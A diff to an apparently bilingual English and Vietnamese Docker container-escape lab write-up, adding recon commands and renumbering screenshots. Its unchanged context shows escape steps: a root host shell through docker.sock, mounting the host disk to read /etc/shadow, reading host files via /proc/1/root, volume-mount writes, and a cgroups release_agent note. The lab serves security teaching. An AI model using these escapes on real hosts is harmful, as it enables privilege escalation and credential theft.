@@ -73,10 +73,20 @@ Linux to verify entry before testing the breakout steps.
 ## Recon
 
 Before attempting any breakout, inspect the boundaries visible from inside an unprivileged
-container versus the misconfigured targets. In a properly isolated container, `/dev` contains
-only minimal virtual nodes (`null`, `zero`, `random`, `pts`), `ps aux` shows only the
-container's own PID 1, and `/var/run/docker.sock` is absent. Checking `mount`, `ls /dev`,
-`ps aux`, and `ls -la /var/run` surfaces exposed privileges immediately.
+container versus the misconfigured targets. In a properly isolated container, `CapEff` in
+`/proc/self/status` stays bounded (`00000000a80425fb`), `/dev` contains only minimal virtual
+nodes (`null`, `zero`, `random`, `pts`), `ps aux` shows only the container's own PID 1, and
+`/var/run/docker.sock` is absent. Checking `CapEff`, `mount`, `ls /dev`, `ps aux`, and
+`ls -la /var/run` surfaces exposed privileges immediately:
+
+```bash
+grep -E 'CapEff|NoNewPrivs' /proc/self/status
+ls /dev
+ps aux
+ls -la /var/run/docker.sock
+```
+
+![Baseline unprivileged Alpine container compared against misconfigured lab targets]({{ '/images/docker-escape-lab/02-recon-baseline-vs-lab.png' | relative_url }})
 
 ---
 
@@ -122,7 +132,7 @@ PRETTY_NAME="Docker Desktop"
 uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
 ```
 
-![Inspecting /var/run/docker.sock and spawning a chroot host shell]({{ '/images/docker-escape-lab/02-sock-escape.png' | relative_url }})
+![Inspecting /var/run/docker.sock and spawning a chroot host shell]({{ '/images/docker-escape-lab/03-sock-escape.png' | relative_url }})
 
 The shell now operates directly on the host filesystem with root privileges.
 
@@ -210,7 +220,7 @@ bin:x:19949:7:99999:7:::
 daemon:x:19949:7:99999:7:::
 ```
 
-![Mounting /dev/sda inside a privileged container and reading host /etc/shadow]({{ '/images/docker-escape-lab/03-privileged-disk-mount.png' | relative_url }})
+![Mounting /dev/sda inside a privileged container and reading host /etc/shadow]({{ '/images/docker-escape-lab/04-privileged-disk-mount.png' | relative_url }})
 
 On older kernels running cgroups v1, a privileged or `CAP_SYS_ADMIN` container can also mount
 a cgroup controller and register a host script in `release_agent` to execute as host root
@@ -251,7 +261,7 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 ```
 
-![Viewing host PID 1 and reading host /etc/passwd through /proc/1/root]({{ '/images/docker-escape-lab/04-pid-host-proc-root.png' | relative_url }})
+![Viewing host PID 1 and reading host /etc/passwd through /proc/1/root]({{ '/images/docker-escape-lab/05-pid-host-proc-root.png' | relative_url }})
 
 Host configuration files such as `/etc/passwd` become readable without calling `mount`. Any
 write operation under `/proc/1/root/` modifies the host filesystem directly.
@@ -270,7 +280,7 @@ ls -la /host
 echo "Escaped via Volume Mount" > /host/tmp/proof_escape.txt
 ```
 
-![Writing directly to the host filesystem through a writable volume mount]({{ '/images/docker-escape-lab/05-volume-mount-escape.png' | relative_url }})
+![Writing directly to the host filesystem through a writable volume mount]({{ '/images/docker-escape-lab/06-volume-mount-escape.png' | relative_url }})
 
 Converting a host filesystem write primitive into host command execution follows three
 common paths:
@@ -373,11 +383,21 @@ Linux tối giản để đối chiếu trước khi thực hiện các bước 
 ## Recon
 
 Trước khi khai thác, cần đối chiếu sự khác biệt giữa một container cấu hình chuẩn và các
-container đang bị hở quyền. Ở container bị cô lập chặt, thư mục `/dev` chỉ chứa một số thiết
-bị ảo cơ bản (`null`, `zero`, `random`, `pts`), lệnh `ps aux` chỉ hiển thị tiến trình PID 1
-của riêng container đó, và không có quyền truy cập `/var/run/docker.sock`. Kiểm tra nhanh
-bằng `mount`, `ls /dev`, `ps aux` và `ls -la /var/run` sẽ phát hiện ngay các thành phần bị
-phơi bày từ máy host.
+container đang bị hở quyền. Ở container bị cô lập chặt, giá trị `CapEff` trong
+`/proc/self/status` bị giới hạn (`00000000a80425fb`), thư mục `/dev` chỉ chứa các thiết bị
+ảo cơ bản (`null`, `zero`, `random`, `pts`), lệnh `ps aux` chỉ hiển thị tiến trình PID 1
+của riêng container đó, và không có `/var/run/docker.sock`. Kiểm tra nhanh bằng `CapEff`,
+`mount`, `ls /dev`, `ps aux` và `ls -la /var/run` sẽ phát hiện ngay các thành phần bị phơi
+bày từ máy host:
+
+```bash
+grep -E 'CapEff|NoNewPrivs' /proc/self/status
+ls /dev
+ps aux
+ls -la /var/run/docker.sock
+```
+
+![Đối chiếu container Alpine mặc định với bốn container cấu hình hở trong lab]({{ '/images/docker-escape-lab/02-recon-baseline-vs-lab.png' | relative_url }})
 
 ---
 
@@ -423,7 +443,7 @@ PRETTY_NAME="Docker Desktop"
 uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
 ```
 
-![Kiểm tra /var/run/docker.sock và mở shell root trên host qua chroot]({{ '/images/docker-escape-lab/02-sock-escape.png' | relative_url }})
+![Kiểm tra /var/run/docker.sock và mở shell root trên host qua chroot]({{ '/images/docker-escape-lab/03-sock-escape.png' | relative_url }})
 
 Shell lúc này đã nằm trực tiếp trên hệ thống file của máy host với quyền root.
 
@@ -513,7 +533,7 @@ bin:x:19949:7:99999:7:::
 daemon:x:19949:7:99999:7:::
 ```
 
-![Mount phân vùng /dev/sda trong container privileged và đọc /etc/shadow của host]({{ '/images/docker-escape-lab/03-privileged-disk-mount.png' | relative_url }})
+![Mount phân vùng /dev/sda trong container privileged và đọc /etc/shadow của host]({{ '/images/docker-escape-lab/04-privileged-disk-mount.png' | relative_url }})
 
 Trên các hệ thống sử dụng kernel cũ với cgroups v1, container chạy privileged hoặc giữ
 `CAP_SYS_ADMIN` còn có thể mount cgroup controller và gán đường dẫn script vào `release_agent`
@@ -555,7 +575,7 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 ```
 
-![Quan sát tiến trình PID 1 của host và đọc /etc/passwd qua /proc/1/root]({{ '/images/docker-escape-lab/04-pid-host-proc-root.png' | relative_url }})
+![Quan sát tiến trình PID 1 của host và đọc /etc/passwd qua /proc/1/root]({{ '/images/docker-escape-lab/05-pid-host-proc-root.png' | relative_url }})
 
 File cấu hình của host như `/etc/passwd` có thể đọc trực tiếp mà không cần gọi lệnh `mount`.
 Mọi thao tác ghi vào bên trong `/proc/1/root/` đều tác động thẳng xuống ổ đĩa của máy host.
@@ -574,7 +594,7 @@ ls -la /host
 echo "Escaped via Volume Mount" > /host/tmp/proof_escape.txt
 ```
 
-![Ghi file trực tiếp ra hệ thống file của host thông qua volume mount]({{ '/images/docker-escape-lab/05-volume-mount-escape.png' | relative_url }})
+![Ghi file trực tiếp ra hệ thống file của host thông qua volume mount]({{ '/images/docker-escape-lab/06-volume-mount-escape.png' | relative_url }})
 
 Từ quyền ghi lên hệ thống file của host, có ba hướng phổ biến để đạt mức thực thi mã trên
 máy chủ:
